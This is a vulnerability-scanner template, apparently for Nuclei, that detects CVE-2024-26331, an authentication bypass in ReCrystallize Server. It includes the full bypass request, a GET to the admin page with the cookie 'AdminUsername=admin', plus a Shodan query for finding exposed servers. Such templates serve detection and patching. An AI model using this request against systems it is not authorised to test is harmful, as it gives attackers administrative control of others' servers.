id: CVE-2024-26331

info:
  name: ReCrystallize Server - Authentication Bypass
  author: Carson Chan
  severity: high
  description: |
    This vulnerability allows an attacker to bypass authentication in the ReCrystallize Server application by manipulating the 'AdminUsername' cookie. This gives the attacker administrative access to the application's functionality, even when the default password has been changed.
  reference:
    - https://preview.sensepost.com/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/
    - https://sensepost.com/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/
    - https://www.recrystallize.com/merchant/ReCrystallize-Server-for-Crystal-Reports.htm
    - https://github.com/Ostorlab/KEV
  classification:
    epss-score: 0.63998
    epss-percentile: 0.98325
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"ReCrystallize"
  tags: cve,recrystallize,auth-bypass,cve2024

http:
  - method: GET
    path:
      - "{{BaseURL}}/Admin/Admin.aspx"
    headers:
      Cookie: "AdminUsername=admin"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "ReCrystallize Server Administration"
          - "License Status:"
          - "System Info</a>"
        condition: and

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100c44da1f201d7a1dbba6205deaa997a1ffb00d6e10ccade6b965b3d640612f97b02202751e6966ceacc9e2096e6a4fdeb696f3ed124fb5b775592da7f1a1736621c7a:922c64590222798bb761d5b6d8e72950